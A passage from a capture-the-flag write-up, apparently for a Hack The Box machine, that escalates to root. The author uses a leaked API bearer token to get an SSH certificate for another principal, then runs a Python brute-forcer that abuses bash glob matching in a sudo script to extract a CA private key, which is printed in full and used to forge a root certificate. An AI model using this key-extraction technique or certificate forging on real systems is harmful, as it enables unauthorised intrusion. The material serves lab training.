0:59 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
0:60 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
0:28 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - cgroup2 cgroup rw,nsdelegate,memory_recursiveprot
0:55 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
0:61 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k,inode64
253:0 /var/snap/docker/common/var-lib-docker/containers/ef9c878c88f2b801920187028f0d536d2610efedd09aab83b7eeccedb9150c55/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
253:0 /var/snap/docker/common/var-lib-docker/containers/ef9c878c88f2b801920187028f0d536d2610efedd09aab83b7eeccedb9150c55/hostname /etc/hostname rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
253:0 /var/snap/docker/common/var-lib-docker/containers/ef9c878c88f2b801920187028f0d536d2610efedd09aab83b7eeccedb9150c55/hosts /etc/hosts rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
0:57 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw
0:57 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw
0:57 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw
0:57 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw
0:57 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw
0:70 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64
```

The next day I had to check for tips and apparently what I was missing is:

- What i have archived was to get access into docker environment as zzinter/root
- I need to find another username that will give me access as lowpriv user on the backend linux.
- Next login as root

&nbsp;

# Road to root.txt(FINAL)

In this case the key is in the sign script under zzinter user on the docker:

![942621f71b9086f253c115c6f3e6d54c.png](../../../_resources/942621f71b9086f253c115c6f3e6d54c.png)

As you see there are many principals that we might try in order to get login into back-end, we just need to find the right one.

And after some test "Support" is the right one!

Now we need to use the provided script that uses the ca from the backend to login into server:

```
root@itrc:/home/zzinter# cat sign_key_api.sh 
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

We need to generate the new cert for login:

![17472626db46d15e70ca2d104db800f3.png](../../../_resources/17472626db46d15e70ca2d104db800f3.png)

And now we should be able to use the script from the machine to generate a new certificate for the support username via the CA certificate from the backend via the `signserv.htb` api.

![73257adc0e7c7ae810a86e6121c91678.png](../../../_resources/73257adc0e7c7ae810a86e6121c91678.png)

```
└─# ./signer.sh support.pub "support" "support"
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgV9hFPHVbsG+3caO3NKyZF0y/qXVWxQkOVfORfDhm4nkAAAADAQABAAABAQC2iZZzjN8uomAEcmXjxSXORe3DSAymR/JDIEutc13h6tkiT9v+g9bzl6XSUYPbFa2Y1/J8lxRVPVXK+TPEzx0KqtTkPkA+JaFvDyUs7Y5DGUwAE21fOxAk3iPQzGtB6mPzzO5xlQA84i4VKyeQKhL8gGk3CxJQtsY0aT45+bCIf8e31ebYpeAZkEKS9+kn5vRYK8/sh4i42uff6MIVXM9Ww2kfqFG36yyMJ8u4jpBIN9LtO5NSKsm7Yg9d0OXc8Km19ZVNUKO6dZyTz3WDEdpQ3CMbTixLwRD+YlD0lZ1aaCHnmoIuCwMmCAd3+Op+gRXj1gmv7GrLqZRPkKHWA+2ZAAAAAAAAADIAAAABAAAAB3N1cHBvcnQAAAALAAAAB3N1cHBvcnQAAAAAZquim///////////AAAAAAAAAIIAAAAVcGVybWl0LVgxMS1mb3J3YXJkaW5nAAAAAAAAABdwZXJtaXQtYWdlbnQtZm9yd2FyZGluZwAAAAAAAAAWcGVybWl0LXBvcnQtZm9yd2FyZGluZwAAAAAAAAAKcGVybWl0LXB0eQAAAAAAAAAOcGVybWl0LXVzZXItcmMAAAAAAAAAAAAAADMAAAALc3NoLWVkMjU1MTkAAAAggeDwK53LVKHJh+rMLcA2WABxbtDgyhm57MATyY0VKbEAAABTAAAAC3NzaC1lZDI1NTE5AAAAQOmA6lucKgf1+A0ZDFd7rEEG3AzKj7MGz0tZiX7o+guSR+/F88vnYS2L7RxU++3whmmMT5lPTNBYglYPgmIReg8= root@kali-bello
```

This must be saved as `support-cert.pub` and used to login into server. On the service TCP/2222:

```
──(root㉿kali-bello)-[~millycash/Downloads/Resources]
└─# ssh -i support -i support-cert.pub -p 2222 support@ssg.htb
The authenticity of host '[ssg.htb]:2222 ([10.10.11.27]:2222)' can't be established.
ED25519 key fingerprint is SHA256:tOsmHdA7xDQq2UDyCf0EobZ/LcitevFrAQ6RSJCy10Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[ssg.htb]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Aug  8 03:03:32 PM UTC 2024

  System load:           0.0
  Usage of /:            78.6% of 10.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             256
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.27
  IPv6 address for eth0: dead:beef::250:56ff:fe94:5317


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Aug  8 06:13:03 2024 from 10.10.14.3
support@ssg:~$
```

Now we are into the backend but no flags are saved in support and we have the other user zzinter but this time again on the backend:

![a8da280dc777657b33d0529b00ae612f.png](../../../_resources/a8da280dc777657b33d0529b00ae612f.png)

The key here is to check the valid principals from `/etc/ssh/auth_principals`.

```
support@ssg:/etc/ssh/auth_principals$ ls -al
total 20
drwxr-xr-x 2 root root 4096 Feb  8 12:16 .
drwxr-xr-x 5 root root 4096 Jul 24 12:24 ..
-rw-r--r-- 1 root root   10 Feb  8 12:16 root
-rw-r--r-- 1 root root   18 Feb  8 12:16 support
-rw-r--r-- 1 root root   13 Feb  8 12:11 zzinter
support@ssg:/etc/ssh/auth_principals$ cat support 
support
root_user
support@ssg:/etc/ssh/auth_principals$ cat zzinter 
zzinter_temp
support@ssg:/etc/ssh/auth_principals$
```

As you see the zzinter on the backend have "zzinter_temp" as principal name and this must be added to the signing script!

![f57f245881b2a9092b0cb6309199034a.png](../../../_resources/f57f245881b2a9092b0cb6309199034a.png)

And time to generate a new certificate again:

![c340b291565c88562d84f4e0351dfad2.png](../../../_resources/c340b291565c88562d84f4e0351dfad2.png)

![b0b73a1021f8dfe01460faafcd939ec9.png](../../../_resources/b0b73a1021f8dfe01460faafcd939ec9.png)

And now if we check for sudo permissions we can see traces of yet another script:

```
zzinter@ssg:~$ sudo -l
Matching Defaults entries for zzinter on ssg:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zzinter may run the following commands on ssg:
    (root) NOPASSWD: /opt/sign_key.sh
zzinter@ssg:~$
```

This is our way in as we can see the code:

```
zzinter@ssg:~$ cat /opt/sign_key.sh
#!/bin/bash

usage () {
    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

if [[ $ca == "/etc/ssh/ca-it" ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if ! [[ $serial =~ ^[0-9]+$ ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"

zzinter@ssg:~$
```

What is juicy here is that this script reads the CA certificate from the root server:

![a7f6971146d6bf0c804a40bff9277df0.png](../../../_resources/a7f6971146d6bf0c804a40bff9277df0.png)

And off-course we have no read access to it:

```
ca-it             moduli           sshd_config.d  ssh_host_dsa_key.pub       ssh_host_ed25519_key         ssh_host_rsa_key-cert.pub
zzinter@ssg:/etc/ssh$ cat ca-it
cat: ca-it: Permission denied
zzinter@ssg:/etc/ssh$
```

Now here we can ask to chatgpt to give us a script that brute-forces the ca-it master CA certificates by using a technique called Bash gobbling.

Basically it uses the wildcards to compare, example (a=ciao & b=cia\*) in this case b == a works but a != b since it isn't  same.

![2a94025d42023522de1eba4ffc6b51a4.png](../../../_resources/2a94025d42023522de1eba4ffc6b51a4.png)

And this should take like 10 minutes to guess the password hash but we need to add the appropriate principal name as well:

![e57cc9ab9ef2ae8483bacce020dce804.png](../../../_resources/e57cc9ab9ef2ae8483bacce020dce804.png)

Here I had to ask for help again and got to use this one:

```
import string
import subprocess

header = "-----BEGIN OPENSSH PRIVATE KEY-----"
footer = "-----END OPENSSH PRIVATE KEY-----"
b64chars = string.ascii_letters + string.digits + "+/="
key = []
lines = 0
while True:
    for char in b64chars:
        with open("unknown.key", "w") as f:
            f.write(f"{header}\n{''.join(key)}{char}*")
        proc = subprocess.Popen("sudo /opt/sign_key.sh unknown.key keypair.pub root root_user 1",
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                shell=True)
        stdout, stderr = proc.communicate()
        if proc.returncode == 1:
            key.append(char)
            if len(key) > 1 and (len(key) - lines) % 70 == 0:
                key.append("\n")
                lines += 1
            break
    else:
        break
print(f"{header}\n{''.join(key)}\n{footer}")
with open("unknown.key", "w") as f:
    f.write(f"{header}\n{''.join(key)}\n{footer}")
```

We need to forge a new file:

![e2ee4fae314d21c7f2ef85bc7e9ddecb.png](../../../_resources/e2ee4fae314d21c7f2ef85bc7e9ddecb.png)

And now run the python script in background to get the value of the ca_it on the unknown.key

![fc5d52a28da8532858d5dd160fd1c74b.png](../../../_resources/fc5d52a28da8532858d5dd160fd1c74b.png)

and finally we have the legit key:

```
-----END OPENSSH PRIVATE KEY-----
tail: unknown.key: file truncated
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
QBAgM=
-----END OPENSSH PRIVATE KEY-----
^C[1]+  Done                    python3 bruteforcer.py
```

And now is signing time:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Resources]
└─# ssh-keygen -s ./ca_legit -n "root_user" -I 1 root.pub   
Signed user key root-cert.pub: id "1" serial 0 for root_user valid forever
```

Lastly, can we login as root and gain access to the flag!

&nbsp;

┌──(root㉿kali-bello)-\[/home/millycash/Downloads/Resources\]  
└─# ssh -i root -i root-cert.pub root@ssg.htb -p 2222  
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

\* Documentation: https://help.ubuntu.com  
\* Management: https://landscape.canonical.com  
\* Support: https://ubuntu.com/pro

System information as of Thu Aug 8 03:58:26 PM UTC 2024

System load: 0.03  
Usage of /: 78.8% of 10.73GB  
Memory usage: 22%  
Swap usage: 0%  
Processes: 261  
Users logged in: 1  
IPv4 address for eth0: 10.10.11.27  
IPv6 address for eth0: dead:beef::250:56ff:fe94:5317

&nbsp;

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.  
See https://ubuntu.com/esm or run: sudo pro status

&nbsp;

The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

&nbsp;

Last login: Thu Aug 8 06:54:53 2024 from 10.10.14.3  
root@ssg:~# cat root.txt  
eb572aaddca08bacc8983278edd46185  
root@ssg:~#

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Resources]
└─# ssh -i root -i root-cert.pub root@ssg.htb -p 2222    
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Aug  8 03:58:26 PM UTC 2024

  System load:           0.03
  Usage of /:            78.8% of 10.73GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             261
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.27
  IPv6 address for eth0: dead:beef::250:56ff:fe94:5317


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Aug  8 06:54:53 2024 from 10.10.14.3
root@ssg:~# cat root.txt 
eb572aaddca08bacc8983278edd46185
root@ssg:~#
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;